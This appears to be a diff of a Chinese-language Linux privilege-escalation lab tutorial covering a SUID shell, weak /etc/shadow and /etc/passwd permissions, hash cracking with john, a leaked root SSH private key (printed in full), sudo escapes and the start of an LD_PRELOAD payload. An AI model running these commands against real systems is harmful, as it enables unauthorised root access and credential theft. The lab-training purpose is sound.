+user@debian:~$ /tmp/rootbash -p
+rootbash-4.1# id
+uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643147.png" alt="image-20210630133158537"></p>
+<p>看看目标机器正在监听的端口</p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643148.png" alt="image-20210630134221883"></p>
+<p>但是它绑定到 本地主机地址：127.0.0.1 所以我们不能从外部访问它</p>
+<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p>某些情况下，root过程可能受约束于内部端口<br>如果由于某种原因，漏洞攻击不能在目标机器上本地运行，则端口可以使用SSH转发到本地机器：</p>
+<pre class="line-numbers language-none"><code class="language-none">ssh -R &lt;kali本地端口&gt;:127.0.0.1:&lt; 目标端口 &gt;&lt;苏塞纳梅&gt;@&lt;kali本地IP&gt;
+ssh -R 5555:127.0.0.1:3306 root@192.168.175.130<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h1 id="0x06-脆弱的文件权限"><a href="#0x06-脆弱的文件权限" class="headerlink" title="0x06.脆弱的文件权限"></a>0x06.脆弱的文件权限</h1><h2 id="前言-4"><a href="#前言-4" class="headerlink" title="前言"></a>前言</h2><p>如果某些系统文件的权限太弱，则可以利用某些系统文件执行权限升级。<br>如果系统文件有我们可以读取的机密信息，则可用于访问root<br>如果可以写入系统文件，我们就可以修改，操作系统的工作方式并以这种方式获得root权限</p>
+<h2 id="相关的命令"><a href="#相关的命令" class="headerlink" title="相关的命令"></a>相关的命令</h2><p>在<code>/etc:</code>中查找所有可写文件：</p>
+<pre class="line-numbers language-none"><code class="language-none">find /etc -maxdepth 1 -writable -type f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在<code>/etc:</code>中查找所有可读文件：</p>
+<pre class="line-numbers language-none"><code class="language-none">find /etc -maxdepth 1 -readable -type f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>查找可写入的所有目录：</p>
+<pre class="line-numbers language-none"><code class="language-none">find / -executable -writable -type d 2&gt; /dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h2 id="针对-etc-shadow-文件"><a href="#针对-etc-shadow-文件" class="headerlink" title="针对/etc/shadow 文件"></a>针对/etc/shadow 文件</h2><p><code>/etc/shadow</code>文件包含用户密码哈希值，默认情况下，除root用户外，任何用户都无法读取。</p>
+<ul>
+<li>思路一：<br>如果我们能够读取 /etc/shadow 文件的内容，我们也许能够破解根用户的密码哈希。</li>
+<li>思路二：<br>如果我们能够修改/etc/shadow文件，我们可以用我们所知道的密码哈希替换root用户的密码哈希</li>
+</ul>
+<h3 id="实操一、"><a href="#实操一、" class="headerlink" title="实操一、"></a>实操一、</h3><h4 id="1-检查权限-etc-shadow-文件"><a href="#1-检查权限-etc-shadow-文件" class="headerlink" title="1.检查权限 /etc/shadow 文件"></a>1.检查权限 /etc/shadow 文件</h4><pre class="line-numbers language-none"><code class="language-none">ls -l /etc/shadow <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643149.png" alt="image-20210630140751442"></p>
+<h4 id="2-提取root用户的密码哈希"><a href="#2-提取root用户的密码哈希" class="headerlink" title="2.提取root用户的密码哈希"></a>2.提取root用户的密码哈希</h4><pre class="line-numbers language-none"><code class="language-none">head -n 1 /etc/shadow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643150.png" alt="image-20210630140948488"></p>
+<pre class="line-numbers language-none"><code class="language-none">root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="3-将密码哈希保存在文件中"><a href="#3-将密码哈希保存在文件中" class="headerlink" title="3.将密码哈希保存在文件中"></a>3.将密码哈希保存在文件中</h4><pre class="line-numbers language-none"><code class="language-none">echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' &gt; 'hash.txt'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643151.png" alt="image-20210630141431879"></p>
+<h4 id="4-使用开膛手破解密码哈希"><a href="#4-使用开膛手破解密码哈希" class="headerlink" title="4.使用开膛手破解密码哈希"></a>4.使用开膛手破解密码哈希</h4><pre class="line-numbers language-none"><code class="language-none">john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643152.png" alt="image-20210630141447898"></p>
+<h4 id="5-使用su-命令切换到root用户"><a href="#5-使用su-命令切换到root用户" class="headerlink" title="5.使用su 命令切换到root用户"></a>5.使用su 命令切换到root用户</h4><pre class="line-numbers language-none"><code class="language-none">su<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643153.png" alt="image-20210630141653620"></p>
+<h3 id="实操二、"><a href="#实操二、" class="headerlink" title="实操二、"></a>实操二、</h3><h4 id="1-检查权限-etc-shadow-文件："><a href="#1-检查权限-etc-shadow-文件：" class="headerlink" title="1.检查权限/etc/shadow 文件："></a>1.检查权限/etc/shadow 文件：</h4><pre class="line-numbers language-none"><code class="language-none">ls -l /etc/shadow <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="2-复制保存-etc-shadow-的内容，以便我们以后可以恢复"><a href="#2-复制保存-etc-shadow-的内容，以便我们以后可以恢复" class="headerlink" title="2.复制保存/etc/shadow 的内容，以便我们以后可以恢复"></a>2.复制保存/etc/shadow 的内容，以便我们以后可以恢复</h4><pre class="line-numbers language-none"><code class="language-none">-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643154.png" alt="image-20210630142720204"></p>
+<h4 id="3-生成-新的-SHA-512-密码-哈希："><a href="#3-生成-新的-SHA-512-密码-哈希：" class="headerlink" title="3.生成 新的 SHA-512 密码 哈希："></a>3.生成 新的 SHA-512 密码 哈希：</h4><pre class="line-numbers language-none"><code class="language-none">mkpasswd -m sha-512 password    
+$6$WLjW9I7t4e7hhgDy$5smTCs43aPOZCR3KrG.BGuyzDyjsegc3ix3lRSZfX.O26gKGsznN6x9rs6jtxh5//qEZNS2IOUCvgbUQrAU04.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>root用户的密码：password</p>
+<h4 id="4-编辑-etc-shadow，并将根用户的密码哈希替换为我们生成的密码。"><a href="#4-编辑-etc-shadow，并将根用户的密码哈希替换为我们生成的密码。" class="headerlink" title="4.编辑/etc/shadow，并将根用户的密码哈希替换为我们生成的密码。"></a>4.编辑/etc/shadow，并将根用户的密码哈希替换为我们生成的密码。</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643155.png" alt="image-20210630144055411"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643156.png" alt="image-20210630144137065"></p>
+<h4 id="5-使用su-命令切换到根用户"><a href="#5-使用su-命令切换到根用户" class="headerlink" title="5.使用su 命令切换到根用户"></a>5.使用su 命令切换到根用户</h4><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643157.png" alt="image-20210630144159777"></p>
+<h2 id="针对-etc-passwd文件"><a href="#针对-etc-passwd文件" class="headerlink" title="针对/etc/passwd文件"></a>针对/etc/passwd文件</h2><h3 id="前言-5"><a href="#前言-5" class="headerlink" title="前言"></a>前言</h3><p> <code>/etc/passwd</code>历史上包含用户密码哈希。 </p>
+<p> <strong>为了向后兼容，如果/etc/passwd中用户行的第二个字段包含密码哈希，它优先于/etc/shadow中的哈希</strong></p>
+<p> 如果我们可以写入<code>/etc/passwd</code>，我们就可以很容易地输入一个已知的密码散列 root用户，然后使用su命令切换到根用户。 </p>
+<p> 或者，如果我们只能附加到文件，我们可以创建一个新的用户，为他们分配根用户ID(0)。</p>
+<p>这是因为Linux允许多个条目，对于相同的用户名，只要用户名不同 </p>
+<p>/etc/passwd的root帐户配置的：</p>
+<pre class="line-numbers language-none"><code class="language-none">root:x:0:0:root:/root:/bin/bash #通常<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>第二个字段中的<code>x</code>指示 Linux 查找 /etc/shadow文件中的密码哈希。</p>
+<p>在Linux的某些版本中，可以简单地删除<code>x</code>，Linux 将其解释为用户没有密码：</p>
+<pre class="line-numbers language-none"><code class="language-none">root::0:0:root:/root:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="实操-3"><a href="#实操-3" class="headerlink" title="实操"></a>实操</h3><h4 id="检查-etc-passwd文件的权限："><a href="#检查-etc-passwd文件的权限：" class="headerlink" title="检查/etc/passwd文件的权限："></a>检查/etc/passwd文件的权限：</h4><pre class="line-numbers language-none"><code class="language-none">ls -l /etc/passwd <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643158.png" alt="image-20210630145719525"></p>
+<h4 id="2-使用openssl生成密码哈希："><a href="#2-使用openssl生成密码哈希：" class="headerlink" title="2.使用openssl生成密码哈希："></a>2.使用openssl生成密码哈希：</h4><pre class="line-numbers language-none"><code class="language-none">openssl passwd "qwer" <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643159.png" alt="image-20210630145846124"></p>
+<h4 id="3-编辑-etc-passwd文件"><a href="#3-编辑-etc-passwd文件" class="headerlink" title="3.编辑 /etc/passwd文件"></a>3.编辑 <code>/etc/passwd</code>文件</h4><p>输入root用户行第二个字段中的哈希：</p>
+<pre class="line-numbers language-none"><code class="language-none">ZSL11eCDBkMnk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643160.png" alt="image-20210630145957018"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643161.png" alt="image-20210630150036456"></p>
+<p>保存 退出</p>
+<h4 id="4-使用su命令切换到根用户"><a href="#4-使用su命令切换到根用户" class="headerlink" title="4.使用su命令切换到根用户"></a>4.使用su命令切换到根用户</h4><pre class="line-numbers language-none"><code class="language-none">su<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643162.png" alt="image-20210630150207862"></p>
+<p>因为优先级问题 所以机器root账户的密码是：qwer</p>
+<h4 id="or"><a href="#or" class="headerlink" title="or"></a>or</h4><h4 id="1-创建备用根用户"><a href="#1-创建备用根用户" class="headerlink" title="1.创建备用根用户"></a>1.创建备用根用户</h4><pre class="line-numbers language-none"><code class="language-none">qwer:ZSL11eCDBkMnk:0:0:root:/root:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643163.png" alt="image-20210630150549882"></p>
+<h4 id="2-使用su命令切换到新根用户："><a href="#2-使用su命令切换到新根用户：" class="headerlink" title="2.使用su命令切换到新根用户："></a>2.使用su命令切换到新根用户：</h4><pre class="line-numbers language-none"><code class="language-none">su<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643164.png" alt="image-20210630150624343"></p>
+<h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><h3 id="前言-6"><a href="#前言-6" class="headerlink" title="前言"></a>前言</h3><p>即使计算机在重要或敏感文件上拥有正确的权限，用户也可能已创建这些文件的不安全备份。<br>它总是值得探索的文件系统寻找可读的备份文件。</p>
+<p>一些常见的地方包括 / (root) directory, /tmp, and /var/backups</p>
+<h3 id="实操-4"><a href="#实操-4" class="headerlink" title="实操"></a>实操</h3><h3 id="1-在常见位置查找文件，尤其是一些隐藏文件"><a href="#1-在常见位置查找文件，尤其是一些隐藏文件" class="headerlink" title="1.在常见位置查找文件，尤其是一些隐藏文件"></a>1.在常见位置查找文件，尤其是一些隐藏文件</h3><pre class="line-numbers language-none"><code class="language-none">ls -la /home/user 
+ls -la / 
+ls -la /tmp 
+ls -la /var/backups<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643165.png" alt="image-20210630151315783"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643166.png" alt="image-20210630151343205"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643167.png" alt="image-20210630151358879"></p>
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643168.png" alt="image-20210630151410318"></p>
+<h3 id="2-root目录下存在隐藏的-ssh目录："><a href="#2-root目录下存在隐藏的-ssh目录：" class="headerlink" title="2.root目录下存在隐藏的.ssh目录："></a>2.root目录下存在隐藏的<code>.ssh</code>目录：</h3><pre class="line-numbers language-none"><code class="language-none">drwxr-xr-x 2 root root 4096 Aug 24 18:57 .ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="3-翻看-ssh目录"><a href="#3-翻看-ssh目录" class="headerlink" title="3.翻看.ssh目录"></a>3.翻看<code>.ssh</code>目录</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643169.png" alt="image-20210630151814494"></p>
+<p>一个可读的文件<code>root_key</code></p>
+<h3 id="4-进一步检查root-key文件"><a href="#4-进一步检查root-key文件" class="headerlink" title="4.进一步检查root_key文件"></a>4.进一步检查root_key文件</h3><pre class="line-numbers language-none"><code class="language-none">head -n 1 /.ssh/root_key <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643170.png" alt="image-20210630151929543"></p>
+<p>这是一个 SSH 私钥。文件的名称和所有者告诉我们密钥属于root用户：</p>
+<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>在我们尝试使用此密钥之前，让我们确认甚至允许通过 SSH 登录根：</p>
+<pre class="line-numbers language-none"><code class="language-none">grep PermitRootLogin /etc/ssh/sshd_config <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643171.png" alt="image-20210630152045099"></p>
+<h3 id="5-将密钥复制到本地机器，并给予其正确的权限"><a href="#5-将密钥复制到本地机器，并给予其正确的权限" class="headerlink" title="5.将密钥复制到本地机器，并给予其正确的权限"></a>5.将密钥复制到本地机器，并给予其正确的权限</h3><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643172.png" alt="image-20210630152738111"></p>
+<pre class="line-numbers language-none"><code class="language-none">-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm
+gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl
+p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo
+OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD
+eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET
+Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2
+NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ
+YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+
+5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el
+WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7
+VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7
+6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW
+1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K
+824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6
+Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc
+U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1
+Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi
+SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV
+d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im
+jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa
+871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok
+X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4
+CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN
+Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4
+LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==
+-----END RSA PRIVATE KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">chmod 600 root_key 赋予权限<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="6-使用将SSH的密钥登录root帐户："><a href="#6-使用将SSH的密钥登录root帐户：" class="headerlink" title="6.使用将SSH的密钥登录root帐户："></a>6.使用将SSH的密钥登录root帐户：</h3><pre class="line-numbers language-none"><code class="language-none">ssh -i root_key root@192.168.175.228<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643173.png" alt="image-20210704102546394"></p>
+<h1 id="0x07-SUDO"><a href="#0x07-SUDO" class="headerlink" title="0x07 SUDO"></a>0x07 SUDO</h1><h2 id="前言-7"><a href="#前言-7" class="headerlink" title="前言"></a>前言</h2><p>sudo 是一个程序，允许用户运行具有其他用户安全特权的其他程序。</p>
+<p>默认情况下，该其他用户将是root用户<br>用户通常需要输入密码才能使用sudo，并且必须允许用户通过<code>/etc/sudoersfile</code>文件中的规则访问。<br>规则可用于将用户限制在某些程序中，并放弃密码输入要求。</p>
+<h2 id="相关的命令-1"><a href="#相关的命令-1" class="headerlink" title="相关的命令"></a>相关的命令</h2><p>使用sudo运行程序：</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo &lt;program&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>以特定用户的身份运行程序：</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo –u &lt;username&gt; &lt;program&gt;	<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>允许（且不允许）运行列出用户的程序：</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>到目前为止，用sudo最明显的特权升级是使用sudo，因为它是预期的！</p>
+<p>通过使用交换用户<code>su</code>命令生成root</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo su<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>其他方法<br>有些时候不允许执行 su 计划，则有许多其他方法可以升级特权：</p>
+<pre class="line-numbers language-none"><code class="language-none">sudo -s 
+sudo -i 
+sudo /bin/bash 
+sudo passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>即使没有”明显”的方法来升级特权，我们也可以使用外壳逃生序列。</p>
+<h2 id="外壳逃生序列"><a href="#外壳逃生序列" class="headerlink" title="外壳逃生序列"></a>外壳逃生序列</h2><p>即使我们仅限于通过sudo运行某些程序，有时也有可能”逃避”程序并生成壳。<br>由于初始程序具有root权限运行，因此生成的外壳也是如此。<br>此处可以找到带有外壳逃生序列的程序列表：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io</a></p>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="1-列出允许用户运行的程序"><a href="#1-列出允许用户运行的程序" class="headerlink" title="1.列出允许用户运行的程序"></a>1.列出允许用户运行的程序</h3><pre class="line-numbers language-none"><code class="language-none">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643174.png" alt="image-20210630162439011"></p>
+<h3 id="2-对每个程序进行查表，要细心"><a href="#2-对每个程序进行查表，要细心" class="headerlink" title="2.对每个程序进行查表，要细心"></a>2.对每个程序进行查表，要细心</h3><p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
+<h3 id="3-如果存在逃生序列，则通过sudo-运行程序并执行序列以生成根壳。"><a href="#3-如果存在逃生序列，则通过sudo-运行程序并执行序列以生成根壳。" class="headerlink" title="3.如果存在逃生序列，则通过sudo 运行程序并执行序列以生成根壳。"></a>3.如果存在逃生序列，则通过sudo 运行程序并执行序列以生成根壳。</h3><h2 id="滥用预期功能"><a href="#滥用预期功能" class="headerlink" title="滥用预期功能"></a>滥用预期功能</h2><p>如果程序没有逃生序列，则仍可能使用它来升级权限。<br>如果我们能够读取root用户拥有的文件，我们也许能够提取有用的信息（例如密码、哈希斯、密钥）。<br>如果我们 可以写信给root拥有的文件，我们也许能够插入或修改信息。</p>
+<h3 id="实操-5"><a href="#实操-5" class="headerlink" title="实操"></a>实操</h3><h4 id="1-允许用户通过Sudo运行的程序："><a href="#1-允许用户通过Sudo运行的程序：" class="headerlink" title="1.允许用户通过Sudo运行的程序："></a>1.允许用户通过Sudo运行的程序：</h4><pre class="line-numbers language-none"><code class="language-none">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643174.png" alt="image-20210630162439011"></p>
+<h4 id="2-apache2"><a href="#2-apache2" class="headerlink" title="2.apache2"></a>2.apache2</h4><p> 已知中：apache2没有任何已知的外壳逃逸 </p>
+<p> 但是，在解析给定的配置文件时，会出错并打印任何它不理解的行 </p>
+<h4 id="3-使用sudo运行apache2，并提供-etc-shadow文件作为配置文件"><a href="#3-使用sudo运行apache2，并提供-etc-shadow文件作为配置文件" class="headerlink" title="3.使用sudo运行apache2，并提供/etc/shadow文件作为配置文件"></a>3.使用sudo运行apache2，并提供/etc/shadow文件作为配置文件</h4><pre class="line-numbers language-none"><code class="language-none">sudo apache2 -f /etc/shadow <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643175.png" alt="image-20210630163336520"></p>
+<h4 id="4-从文件中提取根用户的哈希。"><a href="#4-从文件中提取根用户的哈希。" class="headerlink" title="4.从文件中提取根用户的哈希。"></a>4.从文件中提取根用户的哈希。</h4><h4 id="5-将密码哈希保存在文件中："><a href="#5-将密码哈希保存在文件中：" class="headerlink" title="5.将密码哈希保存在文件中："></a>5.将密码哈希保存在文件中：</h4><pre class="line-numbers language-none"><code class="language-none">echo '$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0' &gt; hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643176.png" alt="image-20210630163503549"></p>
+<h4 id="6-使用开膛手破解密码哈希："><a href="#6-使用开膛手破解密码哈希：" class="headerlink" title="6.使用开膛手破解密码哈希："></a>6.使用开膛手破解密码哈希：</h4><pre class="line-numbers language-none"><code class="language-none">john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643152.png" alt="image-20210630141447898"></p>
+<h4 id="7-使用su-命令切换到root用户"><a href="#7-使用su-命令切换到root用户" class="headerlink" title="7.使用su 命令切换到root用户"></a>7.使用su 命令切换到root用户</h4><pre class="line-numbers language-none"><code class="language-none">su<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643177.png" alt="image-20210630164008714"></p>
+<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><p>通过sudo运行的程序可以从用户的环境中继承环境变量。<br>在<code> /etc/sudoers</code>配置文件中，</p>
+<p>如果设置<code>env_reset</code>选项，sudo 将在新的、最小的环境中运行程序。<br><code>env_keep</code>选项可用于防止某些环境变量远离用户的环境。<br><code>sudo -l</code>时显示配置的选项</p>
+<h4 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h4><h5 id="前言-8"><a href="#前言-8" class="headerlink" title="前言"></a>前言</h5><p>LD_PRELOAD预加载 是一个环境变量，可以设置为共享对象 (.so)文件的路径。<br>设置时，共享对象将先于任何其他对象加载。<br>通过创建自定义共享对象并创建 init()功能，我们可以在加载 object 后立即执行代码。</p>
+<h5 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h5><p>如果真正的用户 ID与有效的用户 ID不同，则LD_PRELOAD将不起作用。<br>必须配置 sudo，以便使用<code>env_keep</code>选项来维护LD_PRELOAD环境变量。</p>
+<h5 id="实操-6"><a href="#实操-6" class="headerlink" title="实操"></a>实操</h5><h5 id="1-列出允许用户运行的程序-1"><a href="#1-列出允许用户运行的程序-1" class="headerlink" title="1.列出允许用户运行的程序"></a>1.列出允许用户运行的程序</h5><pre class="line-numbers language-none"><code class="language-none">sudo -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202108101643179.png" alt="image-20210704102838002"></p>
+<p>注意：<code>env_keep</code>包括<code>LD_PRELOAD</code>环境变量</p>
+<h5 id="2-创建具有以下内容的文件-preload-c-："><a href="#2-创建具有以下内容的文件-preload-c-：" class="headerlink" title="2.创建具有以下内容的文件(preload.c)："></a>2.创建具有以下内容的文件(preload.c)：</h5><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token keyword">void</span> <span class="token function">_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+<span class="token function">unsetenv</span><span class="token punctuation">(</span><span class="token string">"LD_PRELOAD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
